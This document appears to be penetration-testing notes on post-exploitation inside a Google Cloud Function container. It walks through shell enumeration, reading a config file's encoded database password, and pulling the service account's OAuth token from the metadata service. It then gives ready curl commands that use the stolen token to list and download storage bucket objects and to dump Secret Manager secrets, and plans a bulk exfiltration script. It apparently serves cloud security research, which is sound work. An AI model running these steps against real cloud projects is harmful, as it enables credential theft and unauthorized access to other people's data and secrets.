# Google Cloud Platform

## Execution Environment

The container runs as root:

```
id
uid=0(root) gid=0(root) groups=0(root)

whoami
root
```

Exploring through the filesystem:

```
pwd
/srv/files

ls -la
total 167
drwxr-xr-x 2 root root      0 Jan  3 16:49 .
drwxr-xr-x 2 root root      0 Jan  3 16:49 ..
-rw-r--r-- 1 root root    268 Jan  3 16:49 Makefile
-rw-r--r-- 1 root root   1898 Jan  3 16:49 cheetah.go
-rw-r--r-- 1 root root    178 Jan  3 16:49 cheetah.yaml
-rw-r--r-- 1 root root    170 Jan  3 16:49 go.mod
-rw-r--r-- 1 root root   1798 Jan  3 16:49 go.sum
-rw-r--r-- 1 root root 166598 Jan  3 16:49 package-lock.json
-rw-r--r-- 1 root root    939 Jan  3 16:49 package.json
-rw-r--r-- 1 root root    710 Jan  3 16:49 serverless.yml

ls -al /srv
total 6
drwxr-xr-x 2 root root    0 Dec 24 04:51 .
drwxr-xr-x 2 root root    0 Dec 24 04:51 ..
drwxr-xr-x 2 root root    0 Dec 24 04:51 files
-rw-r--r-- 1 root root  189 Dec 24 04:51 go.mod
-r-xr-xr-x 1 root root   11 Dec 24 04:51 serverless-build.yaml
drwxr-xr-x 2 root root    0 Dec 24 04:51 vendor
-r-xr-xr-x 1 root root 6267 Dec 24 04:51 worker.go
```

`/srv/vendor` appears to contain helper code from Google:

```
ls -al /srv/vendor
total 0
drwxr-xr-x 2 root root 0 Dec 24 04:51 .
drwxr-xr-x 2 root root 0 Dec 24 04:51 ..
drwxr-xr-x 2 root root 0 Dec 24 04:51 gcfeventhelper

ls -al /srv/vendor/gcfeventhelper
total 4
drwxr-xr-x 2 root root    0 Dec 24 04:51 .
drwxr-xr-x 2 root root    0 Dec 24 04:51 ..
-r-xr-xr-x 1 root root 3886 Dec 24 04:51 event.go
-r-xr-xr-x 1 root root   22 Dec 24 04:51 go.mod

cat /srv/vendor/gcfeventhelper/event.go
// Package gcfeventhelper exports a helper function GetMetadataAndDataFromBody that unmarshalls
// an event from supervisor (both legacy and current API) and returns GCF-specific
// metadata and event data.
...
```

```
cat cheetah.yaml
# Server configurations
server:
  host: "10.42.42.42"
  port: 8000

# Database credentials
database:
  user: "cheetah_user"
  pass: "QnV0IHVuaWNvcm5zIGFwcGFyZW50bHkgZG8gZXhpc3Qu"
```

```
env
X_GOOGLE_FUNCTION_TIMEOUT_SEC=60
X_GOOGLE_FUNCTION_MEMORY_MB=256
FUNCTION_TIMEOUT_SEC=60
FUNCTION_MEMORY_MB=256
X_GOOGLE_LOAD_ON_START=false
HOME=/root
X_GOOGLE_FUNCTION_TRIGGER_TYPE=HTTP_TRIGGER
PORT=8080
ENTRY_POINT=Cheetah
X_GOOGLE_SUPERVISOR_HOSTNAME=169.254.8.129
FUNCTION_TRIGGER_TYPE=HTTP_TRIGGER
X_GOOGLE_FUNCTION_NAME=Cheetah
X_GOOGLE_GCLOUD_PROJECT=brandonevans
FUNCTION_NAME=Cheetah
SUPERVISOR_INTERNAL_PORT=8081
X_GOOGLE_GCP_PROJECT=brandonevans
X_GOOGLE_FUNCTION_REGION=us-central1
X_GOOGLE_ENTRY_POINT=Cheetah
FUNCTION_REGION=us-central1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
X_GOOGLE_WORKER_PORT=8091
CODE_LOCATION=/srv
SUPERVISOR_HOSTNAME=169.254.8.129
WORKER_PORT=8091
DEBIAN_FRONTEND=noninteractive
X_GOOGLE_FUNCTION_IDENTITY=brandonevans@appspot.gserviceaccount.com
X_GOOGLE_CONTAINER_LOGGING_ENABLED=true
GCLOUD_PROJECT=brandonevans
FUNCTION_IDENTITY=brandonevans@appspot.gserviceaccount.com
X_GOOGLE_CODE_LOCATION=/srv
PWD=/srv/files/
GCP_PROJECT=brandonevans
X_GOOGLE_SUPERVISOR_INTERNAL_PORT=8081
X_GOOGLE_FUNCTION_VERSION=2
NODE_ENV=production
```

The supervisor service is could be a point of interest?

```
curl 169.254.8.129:8081
404 page not found
```

## Metadata Endpoint

[App Engine Metadata Service](
https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata#making_metadata_requests)

Querying the service account for interesting bits of information:

```
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

<account-email>@developer.gserviceaccount.com

```

Querying for the default aliases:

```
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/aliases

default
```

Querying for the default service accounts for the execution role:

```
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/

aliases
email
identity
scopes
token
```

Querying the metadata service for the valid scopes:

```
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes


https://mail.google.com/
https://www.googleapis.com/auth/analytics
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/cloud-platform
https://www.googleapis.com/auth/contacts
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/presentations
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/streetviewpublish
https://www.googleapis.com/auth/urlshortener
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/youtube

```

Querying the service account authentication token, which appears to be valid for 30 minutes.

```
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
{"access_token":"ya29.c.ABC123","expires_in":1676,"token_type":"Bearer"}
```

## Token Pivoting

At the time of this writing, I have not found a way to load up the OAuth access token and use it from the `gcloud` command line interface. This overall makes it harder to run commands against the account, but can still be done directly against the API using a proxy tool, Burp, or by using the SDK from a script (Python, Java, .NET, etc.).

TODO: Write a bucket exhilaration script to do the following for us for all buckets and all items in the project.

Set the *access_token* and project environment variables locally using the values obtained from the function execution environment.

```bash
export GOOGLE_ACCESS_TOKEN=<INSERT ACCESS TOKEN>
export GOOGLE_PROJECT=<GOOGLE PROJECT>
```

List the buckets for the project and query the first bucket:

```bash
curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "https://storage.googleapis.com/storage/v1/b?project=$GOOGLE_PROJECT" | jq '.items[0].selfLink'
```

List the objects in the storage bucket

```bash
export GOOGLE_PROJECT_BUCKET=$(curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "https://storage.googleapis.com/storage/v1/b?project=$GOOGLE_PROJECT" | jq -r '.items[0].selfLink')
curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "$GOOGLE_PROJECT_BUCKET/o"
```

Download the object from the bucket:

```bash
export GOOGLE_BUCKET_ITEM=$(curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "$GOOGLE_PROJECT_BUCKET/o" | jq -r '.items[0].selfLink')
curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "$GOOGLE_BUCKET_ITEM?alt=media" --output ~/Downloads/cheetah.jpg
```

List the secrets in the project:

```bash
curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" https://secretmanager.googleapis.com/v1beta1/projects/$GOOGLE_PROJECT/secrets
```

Dump the secret value:

```
export SECRET_NAME=$(curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" https://secretmanager.googleapis.com/v1beta1/projects/$GOOGLE_PROJECT/secrets | jq -r '.secrets[0].name')
curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" https://secretmanager.googleapis.com/v1beta1/$SECRET_NAME/versions/latest:access
```

By default this returns a *403* from the service account running the function:

```
{
  "error": {
    "code": 403,
    "message": "Permission 'secretmanager.versions.access' denied for resource 'projects/123/secrets/cheetah-database-pass/versions/1' (or it may not exist).",
    "status": "PERMISSION_DENIED"
  }
}
```

It appears this is not included the default editor role permissions. You have to explicitly grant the service account the Secret Manager Secret Accessor (secretmanager.versions.access) permission to view the secret value. Then, running the command returns the following:


```
curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" https://secretmanager.googleapis.com/v1beta1/$SECRET_NAME/versions/latest:access

{
  "name": "projects/123/secrets/cheetah-database-pass/versions/1",
  "payload": {
    "data": "UW5WMElIVnVhV052Y201eklHRndjR0Z5Wlc1MGJIa2daRzhnWlhocGMzUXU="
  }
}
```
